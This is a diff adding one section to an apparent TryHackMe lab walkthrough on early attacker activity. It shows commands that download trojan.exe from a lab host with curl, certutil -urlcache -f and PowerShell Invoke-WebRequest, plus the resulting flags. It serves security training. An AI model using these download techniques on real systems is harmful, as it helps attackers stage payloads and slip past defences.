@@ -214,3 +214,43 @@ Discover how to detect and analyze the first steps of threat actors after breach
 - Answer: `collecteddata-storage-2025.s3.amazonaws.com`
 
 ## Task 6
+
+### Open the Chrome browser on the VM and navigate to the URL. What is the flag in the response?
+
+- We can navigate to the given URL and get the flag easily
+
+<p align="center">
+<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/e6420ae2-f10f-4d28-ae32-710d01884e99" />
+</p>
+
+- Answer: `THM{just_use_web_browser}`
+
+### Next, open CMD and download the file from the same URL using curl.exe. What is the flag in the response?
+
+- Opening the command prompt and typing in `curl http://appsforfree.thm/trojan.exe` and we get the flag easily
+
+<p align="center">
+<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/e60f7e84-258e-4241-a271-e7945ce1d1d8" />
+</p>
+
+- Answer: `THM{curl_is_cool}`
+
+### Continue with the same CMD and URL, but now using certutil.exe. What is the flag in the response?
+
+- Opening command prompt we can use the command `certutil -urlcache -f http://appsforfree.thm/trojan.exe` where `certutil` is a Windows tool, `-urlcache` uses its URL cache functionality, and `-f` forces the download
+
+<p align="center">
+<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/41b5daf3-8467-45df-9dfa-9db4ce7cd5cd" />
+</p>
+
+- Answer: `THM{abusing_certutil}`
+
+### Finally, download the same file using PowerShell IWR. What is the flag in the response?
+
+- This time we run powershell instead of command prompt using the command `powershell -c "Invoke-WebRequest" -Uri 'http://appsforfree.thm/trojan.exe'` where `powershell` runs Windows PowerShell, `-c` tells it to execute a command, `Invoke-WebRequest` sends a web request, and `-Uri` specifies the URL to access
+
+<p align="center">
+<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/84961de7-9109-439b-9b11-401473acdd8e" />
+</p>
+
+- Answer: `THM{power_of_powershell}`
